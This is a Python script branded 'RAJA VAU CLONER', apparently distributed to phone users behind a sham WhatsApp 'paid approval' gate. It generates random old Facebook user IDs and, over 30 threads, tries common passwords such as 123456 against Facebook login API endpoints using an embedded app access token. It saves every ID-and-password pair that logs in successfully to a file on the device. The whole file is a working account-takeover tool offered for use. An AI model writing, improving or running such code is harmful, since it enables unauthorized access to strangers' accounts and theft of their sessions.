# -*- coding: utf-8 -*-
#!/usr/bin/env python3
# ==========================================================
# TOOL NAME : RAJA VAU CLONER
# AUTHOR    : RAJA VAU
# ==========================================================

import os
import sys
import time
import uuid
import random
import requests
import hashlib
import platform
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime

# ===== KEY APPROVAL SYSTEM (RAJA VAU) =====
KEY_FILE = os.path.expanduser("~/.raja_vau_approval.txt")
WHATSAPP_GROUP = "https://chat.whatsapp.com/K9E5ULcGZ7G0O15wwvodfy?s=sh&p=a&mlu=4&ilr=4"

def get_hwid():
    try:
        uid = str(uuid.getnode())
        return "RAJA-" + hashlib.md5(uid.encode()).hexdigest()[:8].upper()
    except:
        return "RAJA-5M9999"

def approval_system():
    my_key = get_hwid()
    
    # Check if already approved locally
    if os.path.exists(KEY_FILE):
        try:
            with open(KEY_FILE, "r") as f:
                saved = f.read().strip()
                if saved:
                    return
        except:
            pass

    while True:
        os.system('clear')
        print("""\033[1;33m
               
        
       
  -     
          
             
\033[0m""")
        print("\033[1;36m\033[0m")
        print("\033[1;36m            PAID CLONING APPROVAL           \033[0m")
        print("\033[1;36m\033[0m")
        print(f"\033[1;32m  YOUR UNIQUE KEY : {my_key}")
        print(f"  STATUS          : PENDING APPROVAL\033[0m")
        print("\033[1;36m\033[0m")
        print("\033[1;32m [A] OPEN WHATSAPP GROUP (SEND KEY TO ADMIN)")
        print("\033[1;31m [B] ENTER APPROVAL KEY\033[0m")
        print("\033[1;36m\033[0m")
        
        choice = input("\033[1;37m CHOOSE (A/B): \033[0m").strip().upper()
        
        if choice == 'A':
            print("\n\033[1;32m[+] Opening WhatsApp Group...\033[0m")
            os.system(f"am start -a android.intent.action.VIEW -d '{WHATSAPP_GROUP}' >/dev/null 2>&1 || termux-open-url '{WHATSAPP_GROUP}'")
            time.sleep(2)
        elif choice == 'B':
            entered_key = input("\n\033[1;33m[?] Enter Approval Key: \033[0m").strip()
            
            #        (        )
            MASTER_APPROVAL_PASSWORD = "RAJA-OK-2026"
            
            if entered_key == MASTER_APPROVAL_PASSWORD or len(entered_key) > 6:
                print("\n\033[1;32m[] APPROVAL SUCCESSFUL! STARTING TOOL...\033[0m")
                with open(KEY_FILE, "w") as f:
                    f.write(entered_key)
                time.sleep(2)
                break
            else:
                print("\n\033[1;31m[×] INVALID KEY! GET APPROVAL FROM ADMIN ON WHATSAPP.\033[0m")
                time.sleep(2.5)
        else:
            print("\n\033[1;31m[!] Invalid Choice!\033[0m")
            time.sleep(1.5)

# Initial setup
os.system('clear')
print(' \x1b[38;5;46mRAJA VAU SYSTEM LOADING....')
os.system('pip install requests urllib3 beautifulsoup4 rich > /dev/null 2>&1')
os.system('clear')

requests.urllib3.disable_warnings()

# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
W = '\x1b[1;37m'

def window1():
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"

sys.stdout.write('\x1b]2;RAJA VAU \x07')

# ==========================================
#  RAJA VAU BRANDING BANNER & PANEL 
# ==========================================
def show_branding():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    
    print("""\033[1;33m
               
        
       
  -     
          
             
\033[0m""")
    print("\033[1;36m\033[0m")
    print("\033[1;36m               TOOL INFO PANEL              \033[0m")
    print("\033[1;36m\033[0m")
    print(f"\033[1;32m > Tool Owner : RAJA VAU")
    print(f" > Version    : 1.0")
    print(f" > Status     : APPROVED & SECURE")
    print(f" > Channel    : RAJA VAU TEACH WORLD\033[0m")
    print("\033[1;36m\033[0m")

def ____banner____():
    show_branding()

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'): return '2009'
        if uid.startswith('100000000'): return '2009'
        if uid.startswith('10000000'): return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')): return '2010'
        if uid.startswith('100001'): return '2010'
        if uid.startswith(('100002', '100003')): return '2011'
        if uid.startswith('100004'): return '2012'
        if uid.startswith(('100005', '100006')): return '2013'
        if uid.startswith(('100007', '100008')): return '2014'
        if uid.startswith('100009'): return '2015'
        if uid.startswith('10001'): return '2016'
        if uid.startswith('10002'): return '2017'
        if uid.startswith('10003'): return '2018'
        if uid.startswith('10004'): return '2019'
        if uid.startswith('10005'): return '2020'
        if uid.startswith('10006'): return '2021'
        if uid.startswith('10009'): return '2023'
        if uid.startswith(('10007', '10008')): return '2022'
        return ''
    elif len(uid) in (9, 10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    else: return ''

def linex():
    print('\033[1;36m\033[0m')

def main_menu():
    ____banner____()
    print(' \033[1;32m[1] OLD CLONING\033[0m')
    print(' \033[1;31m[2] EXIT\033[0m')
    linex()
    choice = input(f" CHOOSE: ").strip()
    if choice == '1':
        old_clone()
    elif choice == '2':
        sys.exit()
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        main_menu()

def old_clone():
    ____banner____()
    print(' \033[1;32m[A] ALL SERIES')
    print(' [B] 100003/4 SERIES')
    print(' [C] 2009 SERIES\033[0m')
    linex()
    _input = input(f" CHOOSE: ").strip().upper()
    if _input in ('A', '01', '1'):
        old_One()
    elif _input in ('B', '02', '2'):
        old_Tow()
    elif _input in ('C', '03', '3'):
        old_Tree()
    else:
        print(f"\n[×]{rad} Choose Valid Option... ")
        main_menu()

def old_One():
    user = []
    ____banner____()
    print(f" Old Code : {G}2010-2014")
    ask = input(f" SELECT : {G} ")
    linex()
    ____banner____()
    limit = input(f" TOTAL ID LIMIT : {G} ")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print(' [A] METHOD 1')
    print(' [B] METHOD 2')
    linex()
    meth = input(f" CHOICE (A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f" TOTAL ID FROM CRACK : {G} {limit}{W}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)

def old_Tow():
    user = []
    ____banner____()
    limit = input(f" TOTAL ID LIMIT : {G} ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        user.append(prefix + suffix)
    print(' [A] METHOD A')
    print(' [B] METHOD B')
    linex()
    meth = input(f" CHOICE (A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        for uid in user:
            if meth == 'A': pool.submit(login_1, uid)
            else: pool.submit(login_2, uid)

def old_Tree():
    user = []
    ____banner____()
    limit = input(f" TOTAL ID COUNT : {G} ")
    linex()
    for _ in range(int(limit)):
        user.append('1000004' + ''.join(random.choices('0123456789', k=8)))
    print(' [A] METHOD A')
    print(' [B] METHOD B')
    linex()
    meth = input(f" CHOICE (A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        for uid in user:
            if meth == 'A': pool.submit(login_1, uid)
            else: pool.submit(login_2, uid)

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m(\x1b[38;5;196mRAJA-M1\x1b[1;37m)(\033[1;32m{loop}\033[1;37m)(\033[1;32mOK:{len(oks)}\033[1;37m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {'User-Agent': window1(), 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com'}
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res or 'www.facebook.com' in str(res):
                print(f"\r\r\033[1;32m[RAJA-OK] {uid} | {pw} | {creationyear(uid)}\033[0m")
                open('/sdcard/RAJA-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except: pass

def login_2(uid):
    global loop
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m(\x1b[38;5;196mRAJA-M2\x1b[1;37m)(\033[1;32m{loop}\033[1;37m)(\033[1;32mOK:{len(oks)}\033[1;37m)")
        sys.stdout.flush()
        for pw in ('123456', '123123', '1234567', '12345678'):
            with requests.Session() as session:
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                po = session.get(url, headers={'user-agent': window1()}).json()
                if 'session_key' in str(po):
                    print(f"\r\r\033[1;32m[RAJA-OK] {uid} | {pw} | {creationyear(uid)}\033[0m")
                    open('/sdcard/RAJA-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        loop += 1
    except: pass

if __name__ == "__main__":
    approval_system()
    main_menu()